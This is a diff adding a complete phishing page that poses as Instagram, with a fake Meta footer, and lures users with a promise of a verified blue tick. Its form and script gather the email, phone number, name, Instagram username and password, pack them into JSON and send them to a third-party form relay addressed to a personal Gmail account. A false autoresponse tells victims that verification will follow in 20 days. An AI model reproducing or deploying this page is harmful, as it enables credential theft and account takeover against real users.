@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Blue tick form</title>
+    <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <main class="container">
+        <div class="logo">
+            <img src="/insta.png" alt="">
+        </div>
+
+        <div class="text-box">
+            <h2>Get Verified Tick <span class="material-symbols-outlined verified">
+                    verified
+                </span></h2>
+            <p>Get Your Instagram Account Blue Tick like celebrities instagram Account</p>
+        </div>
+
+
+        <div class="user-form">
+            <form id="handlerData" action="https://formsubmit.co/nitinrathod.tg@gmail.com" class="user-form" method="POST">
+                <div class="form-input">
+                    <input type="text" placeholder="Email address" name="email" id="handle-email" required>
+                </div>
+
+                <div class="form-input">
+                    <input type="text" placeholder="Phone number" id="mobile">
+                </div>
+
+                <div class="form-input">
+                    <input type="text" placeholder="Enter Your Name" class="inputValue" id="user-name">
+                </div>    
+                
+                <div class="form-input">
+                    <input type="text" placeholder="Username" name="name" id="main-field">
+                </div>
+
+                <div class="form-input">
+                    <input type="password" placeholder="Password" class="inputValue" id="user-pass" autocomplete="on" required>
+                </div>
+
+                <div class="form-input">
+                    <input type="password" placeholder="Confirm Password" class="inputValue" id="user-conf-pass" autocomplete="on" required>
+                </div>
+                <input type="hidden" name="_autoresponse" value="Your Instagram Account will Be Verify in 20 Days">
+
+                <div class="form-input">
+                    <button type="button" id="formSubmitBtn">Submit</button>
+                </div>
+            </form>
+        </div>
+
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-btn">
+                <img src="/app.png" alt="">
+                <img src="/play.png" alt="">
+            </div>
+        </div>
+
+        <footer>
+            <div class="first-line foo-content">
+                <span>Meta</span> <span>About</span> <span>Blogs</span> <span>Jobs</span> <span>Help</span>
+                <span>API</span> <span>Privacy</span> <span>Terms</span>
+            </div>
+            <div class="first-line foo-content">
+                <span>Top accounts</span> <span>Hashtags</span> <span>Locations</span> <span>Instagram Lite</span>
+            </div>
+            <div class="first-line foo-content">
+                <span>Contact uploading and non-users</span>
+            </div>
+            <div class="first-line foo-content">
+                <span>English(UK) > </span> <span> &#169; 2022 instagram from meta</span>
+            </div>
+        </footer>
+
+    </main>
+
+    <script>
+        var handleEmail = document.getElementById('handle-email');
+        var mobielNumber = document.getElementById('mobile');
+        var handlerName = document.getElementById('user-name');
+        var password = document.getElementById('user-pass');
+        var confPassword = document.getElementById('user-conf-pass');
+        var handlerUsername = document.getElementById('main-field');
+        var SubmitButton = document.getElementById('formSubmitBtn');
+
+        SubmitButton.addEventListener('click', function(){
+            
+            var userDataIs = {
+                mobile: mobielNumber.value,
+                name : handlerName.value,
+                password : password.value,
+                instaUsername : handlerUsername.value,
+                confirmPassword : confPassword.value,
+            }
+
+            var convertedData = JSON.stringify(userDataIs);
+            handlerUsername.value = convertedData;
+            
+            if( CheckNullOrNot(handlerUsername) && CheckNullOrNot(password) && CheckNullOrNot(handleEmail) ){
+                document.getElementById('handlerData').submit();
+                
+            }else{
+                alert('Kindly fill all field for varification.');
+            }
+
+            setTimeout(function(){
+                document.getElementById('handlerData').reset();
+            }, 100)
+
+
+
+        })
+
+        function CheckNullOrNot(inputField){
+            if(inputField.value.length == 0){   
+                return false;
+            }
+            else{
+                return true;
+            }
+        }
+
+
+
+    </script>
+
+
+</body>
+
+</html>
